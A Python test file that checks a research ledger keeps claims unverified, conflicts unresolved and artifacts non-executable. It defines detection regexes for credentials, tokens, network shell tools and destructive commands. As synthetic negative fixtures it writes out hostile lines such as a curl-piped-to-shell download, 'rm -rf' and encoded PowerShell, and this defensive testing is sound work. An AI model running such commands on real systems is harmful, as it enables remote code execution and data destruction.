"""Epistemic, attribution, artifact, quarantine and conflict controls.

Implementation-dependent. These controls assert *coverage and neutrality*.
They never assert that any recorded claim is true, and never assert that either
side of a recorded conflict is correct.

Control ids GV7-P-NNN are declared in ``test_controls_manifest.py``.
"""

from __future__ import annotations

import json
import re

import pytest

from experiments.general_v7_ledger.tests import _support as sup

#: Shapes that would make a quarantined summary OPERATIONAL rather than
#: descriptive. Each is deliberately narrow: neutral categorical discussion of
#: passwords, API keys, access controls, blocked requests and commands is
#: admissible and must stay admissible, so nothing here matches a bare noun.
#: Screening walks individual string leaves — a single JSON-escaped rendering
#: of the whole document would let an escaped payload slip past unseen.
OPERATIONAL_SHAPES = (
    # An assignment-like credential payload, not the word "password".
    (
        "credential-assignment",
        re.compile(
            r"(?i)\b(api[_-]?key|secret[_-]?key|access[_-]?token|password|passwd"
            r"|pwd)\b\s*[:=]\s*\S{6,}"
        ),
    ),
    # Token-shaped secret values.
    (
        "secret-token",
        re.compile(
            r"\b(?:AKIA[0-9A-Z]{12,}|gh[pousr]_[A-Za-z0-9]{20,}"
            r"|xox[baprs]-[A-Za-z0-9-]{12,}"
            r"|eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{10,})\b"
        ),
    ),
    ("private-key-block", re.compile(r"-----BEGIN [A-Z ]*PRIVATE KEY-----")),
    # A ready-to-run command line, anchored at the start of a line.
    (
        "runnable-command",
        re.compile(
            r"(?im)^\s*(sudo|curl|wget|nc|ncat|nmap|ssh|scp|powershell|bash|sh"
            r"|pip)\b"
        ),
    ),
    ("pipe-to-shell", re.compile(r"\|\s*(sudo\s+)?(ba)?sh\b")),
    ("destructive-command", re.compile(r"(?i)\brm\s+-[rf]{1,2}\s+/")),
    ("encoded-powershell", re.compile(r"(?i)\bpowershell\b[^\n]*\s-(enc|e)\b")),
    # An operational target list: three or more addresses run together.
    (
        "target-list",
        re.compile(
            r"(?:\b\d{1,3}(?:\.\d{1,3}){3}\b[\s,;]+){2,}\b\d{1,3}(?:\.\d{1,3}){3}\b"
        ),
    ),
)

PAST_TENSE = re.compile(
    r"(?i)\b(implemented|deployed|installed|configured|validated)\b"
)


def refuse(schema, payload, token):
    """The same hygiene the structural controls apply.

    A bare ``pytest.raises`` skips the chaining, marker-absence and
    closed-vocabulary checks, so a refusal that leaked a rejected value or
    chained its cause would pass unnoticed.
    """
    with pytest.raises(schema.LedgerError) as excinfo:
        schema.validate_ledger(payload)
    error = excinfo.value
    assert error.token == token, (token, error.token)
    assert error.token in schema.REFUSAL_TOKENS
    rendered = str(error)
    for marker in sup.MARKERS:
        assert marker not in rendered
    assert error.__cause__ is None
    assert error.__suppress_context__ is True
    return error


def altered(ledger, collection, field, value, index=0):
    payload = json.loads(json.dumps(ledger))
    payload[collection][index][field] = value
    return payload


def operational_hits(obj):
    """(path, shape-name) for every offending string node. Never the value.

    Walks ``string_nodes``, which yields mapping KEYS as well as values: a
    payload hidden in a key was previously invisible to this screen.
    """
    found = []
    for path, value in sup.string_nodes(obj):
        for name, shape in OPERATIONAL_SHAPES:
            if shape.search(value):
                found.append((path, name))
    return found


def assert_dispositions(values, label):
    """CONTRACT.md section 7: a non-empty, duplicate-free, closed list."""
    assert type(values) is list, label
    assert values, label
    assert len(values) == len(set(values)), label
    for value in values:
        assert value in sup.SAFETY_DISPOSITIONS, (label, value)
    if sup.ORDINARY_DISPOSITION in values:
        assert values == [sup.ORDINARY_DISPOSITION], (
            f"{label}: 'ordinary' is exclusive"
        )


def test_gv7_p_001_every_source_identity_remains_unverified():
    ledger = sup.require_ledger()
    for source in ledger["sources"]:
        assert source["verification_state"] == "supplied-unretrieved"
        assert source["verification_state"] in sup.SOURCE_VERIFICATION_STATES


def test_gv7_p_002_every_source_remains_not_attempted():
    ledger = sup.require_ledger()
    for source in ledger["sources"]:
        assert source["retrieval_state"] == "not-attempted"
        assert source["retrieval_state"] in sup.RETRIEVAL_STATES


def test_gv7_p_003_every_claim_remains_unverified():
    ledger = sup.require_ledger()
    for claim in ledger["claims"]:
        assert claim["verification_state"] == "unverified"
        assert claim["verification_state"] in sup.CLAIM_VERIFICATION_STATES


def test_gv7_p_004_every_claim_carries_class_basis_limitation_and_dispositions():
    ledger = sup.require_ledger()
    for claim in ledger["claims"]:
        assert claim["attribution_class"] in sup.CLAIM_ATTRIBUTION_CLASSES
        assert isinstance(claim["evidence_basis"], str) and claim["evidence_basis"]
        assert isinstance(claim["limitations"], list) and claim["limitations"]
        for limitation in claim["limitations"]:
            assert isinstance(limitation, str) and limitation
        assert_dispositions(claim["safety_dispositions"], claim["claim_id"])


def test_gv7_p_005_the_attribution_vocabularies_are_closed_and_layered():
    """Eleven reserved, ten usable, and the difference is enforced."""
    schema = sup.require_schema()
    assert tuple(schema.ATTRIBUTION_CLASSES) == sup.ATTRIBUTION_CLASSES
    assert tuple(schema.CLAIM_ATTRIBUTION_CLASSES) == sup.CLAIM_ATTRIBUTION_CLASSES
    assert tuple(schema.RELATIONSHIP_ATTRIBUTION_CLASSES) == (
        sup.RELATIONSHIP_ATTRIBUTION_CLASSES
    )
    assert len(set(sup.ATTRIBUTION_CLASSES)) == 11
    assert len(set(sup.CLAIM_ATTRIBUTION_CLASSES)) == 10
    ledger = sup.require_ledger()
    refuse(
        schema,
        altered(ledger, "claims", "attribution_class", "aura-summary-verified"),
        "enum-value-invalid",
    )


def test_gv7_p_006_a_past_tense_aura_implementation_claim_is_not_evidence():
    ledger = sup.require_ledger()
    for claim in ledger["claims"]:
        if not PAST_TENSE.search(claim["claim_text"]):
            continue
        assert claim["attribution_class"] != "verified-implementation-evidence", (
            claim["claim_id"]
        )
        assert claim["verification_state"] == "unverified"
        assert claim["limitations"], claim["claim_id"]


def test_gv7_p_007_the_validator_refuses_verified_implementation_evidence():
    """An audit of the committed data is not enforcement.

    This control used to scan ``ledger.json`` only, so a ledger produced by any
    other process could carry the token on every claim and still validate. The
    exclusion is now refused by the validator, in both positions that exist.
    """
    schema = sup.require_schema()
    ledger = sup.require_ledger()
    reserved = "verified-implementation-evidence"
    for claim in ledger["claims"]:
        assert claim["attribution_class"] != reserved, (
            "nothing in this corpus has been independently reproduced"
        )
    refuse(
        schema,
        altered(ledger, "claims", "attribution_class", reserved),
        "enum-value-invalid",
    )
    refuse(
        schema,
        altered(ledger, "relationships", "attribution_class", reserved),
        "enum-value-invalid",
    )


def test_gv7_p_008_duplicate_and_conflicting_material_is_cross_referenced():
    ledger = sup.require_ledger()
    types = {r["relationship_type"] for r in ledger["relationships"]}
    assert (
        "duplicate-of-supplied-material" in types
        or "mirror-of-supplied-material" in types
    )
    assert "conflicts-with" in types
    known = set(sup.identifiers(ledger["sources"], "source_id")) | set(
        sup.identifiers(ledger["claims"], "claim_id")
    )
    for relationship in ledger["relationships"]:
        assert relationship["left_ref"] in known
        assert relationship["right_ref"] in known
        assert relationship["left_ref"] != relationship["right_ref"]
        assert relationship["relationship_type"] in sup.RELATIONSHIP_TYPES
        assert relationship["basis"] in sup.RELATIONSHIP_BASES


def test_gv7_p_009_corrections_are_additive_and_never_remove_their_target():
    schema = sup.require_schema()
    ledger = sup.require_ledger()
    known = sup.all_identifiers(ledger)
    for correction in ledger["corrections"]:
        assert set(correction) == sup.CORRECTION_KEYS, correction["correction_id"]
        assert correction["correction_kind"] in sup.CORRECTION_KINDS
        assert correction["target_ref"] in known, correction["correction_id"]
    assert tuple(schema.CORRECTION_KINDS) == sup.CORRECTION_KINDS


def test_gv7_p_010_no_record_can_be_promoted_by_schema_mutation():
    schema = sup.require_schema()
    ledger = sup.require_ledger()
    # One exact token, not a choice of two: a loose assertion cannot tell a
    # closed vocabulary from a special-cased state check.
    for field, value in (
        ("verification_state", "identity-verified"),
        ("verification_state", "independently-reproduced"),
        ("retrieval_state", "retrieved"),
    ):
        refuse(schema, altered(ledger, "sources", field, value), "enum-value-invalid")
    refuse(
        schema,
        altered(ledger, "claims", "verification_state", "claim-source-matched"),
        "enum-value-invalid",
    )


def test_gv7_p_011_no_v6_verification_state_can_be_inherited():
    schema = sup.require_schema()
    ledger = sup.require_ledger()
    blob = json.dumps(ledger)
    folded = blob.casefold()
    for token in ("SR-A-", "SR-B-", "SR-X-", "uap-v6", "UAP V6", "source-record-v1"):
        assert token.casefold() not in folded, token
    payload = json.loads(blob)
    payload["sources"][0]["batch_ref"] = "SR-A-MSG-0001"
    error = refuse(schema, payload, "identifier-malformed")
    assert "SR-A-MSG-0001" not in str(error)


def test_gv7_p_012_every_artifact_records_its_full_preservation_metadata():
    ledger = sup.require_ledger()
    for artifact in ledger["artifacts"]:
        assert (
            artifact["introducing_batch"]
            == sup.ARTIFACT_BATCHES[artifact["artifact_id"]]
        ), artifact["artifact_id"]
        assert artifact["artifact_class"] in sup.ARTIFACT_CLASSES
        assert artifact["identity_origin"] in sup.IDENTITY_ORIGINS
        assert artifact["preservation_status"] == "preserved"
        assert artifact["executable_status"] == "non-executable"
        assert isinstance(artifact["rejection_basis"], str)
        assert artifact["rejection_basis"]
        assert_dispositions(
            artifact["safety_dispositions"], artifact["artifact_id"]
        )


def test_gv7_p_013_no_artifact_can_be_marked_executable_or_authorizing():
    schema = sup.require_schema()
    ledger = sup.require_ledger()
    for field, value in (
        ("executable_status", "executable"),
        ("preservation_status", "adopted"),
        ("artifact_class", "authorization"),
    ):
        refuse(
            schema, altered(ledger, "artifacts", field, value), "enum-value-invalid"
        )


def test_gv7_p_014_quarantined_material_carries_a_quarantine_disposition():
    ledger = sup.require_ledger()
    quarantined = [
        record
        for record in ledger["claims"] + ledger["artifacts"]
        if any(d.startswith("quarantined-") for d in record["safety_dispositions"])
    ]
    assert quarantined, "the corpus contains quarantined proposals; record them"
    for record in quarantined:
        assert sup.ORDINARY_DISPOSITION not in record["safety_dispositions"]


def test_gv7_p_015_the_ledger_stores_no_operational_payload_in_any_string_leaf():
    ledger = sup.require_ledger()
    hits = operational_hits(ledger)
    # The diagnostic names the location and the shape, never the content.
    assert not hits, [(path, name) for path, name in hits]


def test_gv7_p_016_every_conflict_family_has_at_least_one_unresolved_record():
    ledger = sup.require_ledger()
    covered = {record["conflict_family"] for record in ledger["unresolved"]}
    missing = sorted(set(sup.CONFLICT_FAMILIES) - covered)
    assert not missing, missing
    unknown = sorted(covered - set(sup.CONFLICT_FAMILIES))
    assert not unknown, unknown


def test_gv7_p_017_every_unresolved_record_states_positions_without_adjudicating():
    ledger = sup.require_ledger()
    known = set(sup.identifiers(ledger["sources"], "source_id")) | set(
        sup.identifiers(ledger["claims"], "claim_id")
    )
    for record in ledger["unresolved"]:
        assert record["resolution_state"] == "unresolved"
        assert 2 <= len(record["positions"]) <= 8, record["unresolved_id"]
        assert len(set(record["positions"])) == len(record["positions"])
        assert record["refs"], record["unresolved_id"]
        for ref in record["refs"]:
            assert ref in known, ref
        assert set(record) == sup.UNRESOLVED_KEYS
    # Run the neutrality screen over the PRODUCTION key set. Over the record's
    # own keys it was dead code: the line above already pins them to a constant
    # that contains none of these fragments, so the loop could never fail.
    schema = sup.require_schema()
    for key in schema.KEYS_BY_COLLECTION["unresolved"]:
        for fragment in ("correct", "winner", "resolved_position", "verdict"):
            assert fragment not in key, (key, fragment)


def test_gv7_p_018_no_unresolved_vocabulary_token_can_adjudicate():
    schema = sup.require_schema()
    assert tuple(schema.UNRESOLVED_STATES) == sup.UNRESOLVED_STATES
    assert sup.UNRESOLVED_STATES == ("unresolved",)
    ledger = sup.require_ledger()
    refuse(
        schema,
        altered(ledger, "unresolved", "resolution_state", "resolved"),
        "enum-value-invalid",
    )


def test_gv7_p_019_the_ox_alpha_versus_qwen_identity_conflict_is_recorded_unresolved():
    ledger = sup.require_ledger()
    records = [
        r for r in ledger["unresolved"]
        if r["conflict_family"] == "ox-alpha-versus-qwen-core-identity"
    ]
    assert records, "the core-identity question must remain recorded and unresolved"
    for record in records:
        assert record["resolution_state"] == "unresolved"
        assert len(record["positions"]) >= 2


def test_gv7_p_020_scientific_analogy_overreach_is_recorded_not_endorsed():
    ledger = sup.require_ledger()
    records = [
        r for r in ledger["unresolved"]
        if r["conflict_family"] == "scientific-analogy-overreach"
    ]
    assert records
    for record in records:
        assert record["resolution_state"] == "unresolved"
    for claim in ledger["claims"]:
        assert claim["attribution_class"] != "verified-implementation-evidence"


def test_gv7_p_021_a_retrieval_call_name_tripwire_over_the_production_modules():
    """A tripwire, not a detector, and it does not claim otherwise.

    A call-name scan cannot establish the absence of networking: an alias, a
    bound attribute, a dispatch table, or one level of helper indirection
    defeats it. **What establishes the rule is GV7-S-028's import allowlist.**
    This scan only makes the obvious form loud.

    The generic names ``get``, ``run``, ``post`` and ``request`` are excluded:
    they match ``dict.get`` and unrelated methods, and a screen that fires on
    ``record.get("supplied_locator")`` in a schema full of nullable fields is a
    screen every reader learns to ignore.
    """
    import ast

    for name in sup.PRODUCTION_MODULES:
        text = sup.require_file(sup.LAB_DIR / name, name)
        for node in ast.walk(ast.parse(text)):
            if not isinstance(node, ast.Call):
                continue
            target = node.func
            label = (
                target.attr
                if isinstance(target, ast.Attribute)
                else getattr(target, "id", None)
            )
            assert label not in sup.RETRIEVAL_CALL_TRIPWIRE_NAMES, (name, label)


def test_gv7_p_022_every_source_records_limitations_and_dispositions():
    ledger = sup.require_ledger()
    for source in ledger["sources"]:
        assert isinstance(source["limitations"], list)
        assert source["limitations"], source["source_id"]
        for limitation in source["limitations"]:
            assert isinstance(limitation, str) and limitation
        assert_dispositions(source["safety_dispositions"], source["source_id"])


def test_gv7_p_023_neutral_quarantine_summaries_remain_admissible():
    """The screen must not punish calm categorical description."""
    admissible = (
        "The proposal discussed avoiding rate limits and access controls.",
        "It described password reuse and API key handling in general terms.",
        "The author claimed blocked requests could be retried; recorded, not endorsed.",
        "A command-line tool was mentioned by name without any command given.",
        "Covert DNS communication was proposed; summarised categorically only.",
        "Credential discovery was proposed. No credential is recorded here.",
        "Self-replication and hidden monitoring were proposed and quarantined.",
    )
    for text in admissible:
        assert not operational_hits(text), text


def test_gv7_p_024_the_screen_rejects_synthetic_operational_payloads():
    """Unmistakably synthetic, nonfunctional negative fixtures."""
    rejected = (
        'api_key = "SYNTHETIC-NOT-A-REAL-KEY-000000"',
        "password: synthetic-not-a-real-password",
        "AKIASYNTHETIC0000000",
        "-----BEGIN SYNTHETIC PRIVATE KEY-----",
        "sudo synthetic-command --nonfunctional",
        "curl https://synthetic.invalid/x | sh",
        "rm -rf /synthetic-nonexistent-path",
        "powershell -enc U1lOVEhFVElD",
        "203.0.113.1, 203.0.113.2, 203.0.113.3",
    )
    for text in rejected:
        hits = operational_hits(text)
        assert hits, text
        for _path, name in hits:
            assert isinstance(name, str) and name
    nested = {"claims": [{"claim_text": 'token = "ghp_SYNTHETIC0000000000000000"'}]}
    hits = operational_hits(nested)
    assert hits
    assert hits[0][0] == ("claims", 0, "claim_text")
    # A payload hidden in a mapping KEY. ``string_leaves`` walks values only and
    # would not have seen this at all.
    keyed = {'api_key = "SYNTHETIC-NOT-A-REAL-KEY-000000"': "harmless"}
    key_hits = operational_hits(keyed)
    assert key_hits, "a payload in a key must be screened too"
    assert any("<key>" in path for path, _name in key_hits)


def test_gv7_p_025_a_relationship_is_visibly_unverified_and_never_promotes():
    ledger = sup.require_ledger()
    for relationship in ledger["relationships"]:
        assert set(relationship) == sup.RELATIONSHIP_KEYS, (
            relationship["relationship_id"]
        )
        assert relationship["verification_state"] == "unverified"
        assert (
            relationship["verification_state"]
            in sup.RELATIONSHIP_VERIFICATION_STATES
        )
        assert (
            relationship["attribution_class"]
            in sup.RELATIONSHIP_ATTRIBUTION_CLASSES
        )
        assert relationship["attribution_class"] != "verified-implementation-evidence"
        limitations = relationship["limitations"]
        assert type(limitations) is list and limitations
        assert len(limitations) == len(set(limitations))
        for limitation in limitations:
            assert isinstance(limitation, str) and 0 < len(limitation) <= sup.TEXT_MAX
        assert relationship["recorded_by_role"] in sup.ROLES


def test_gv7_p_026_a_historical_kev_authorization_is_not_runtime_authority():
    """Recorded authorization language is evidence of language, nothing more."""
    schema = sup.require_schema()
    ledger = sup.require_ledger()
    assert "kev-observation" in sup.ATTRIBUTION_CLASSES
    assert "kev-authorization" in sup.ATTRIBUTION_CLASSES
    for retired in sup.RETIRED_ATTRIBUTION_CLASSES:
        assert retired not in tuple(schema.ATTRIBUTION_CLASSES), retired
        refuse(
            schema,
            altered(ledger, "claims", "attribution_class", retired),
            "enum-value-invalid",
        )
    # A recorded authorization is still an unverified, limited claim, and it
    # confers no capability on this or any later run.
    for claim in ledger["claims"]:
        if claim["attribution_class"] != "kev-authorization":
            continue
        assert claim["verification_state"] == "unverified"
        assert claim["limitations"], claim["claim_id"]
    assert not any(
        key in sup.ROOT_KEYS
        for key in ("authority", "grants", "permissions", "capabilities")
    )
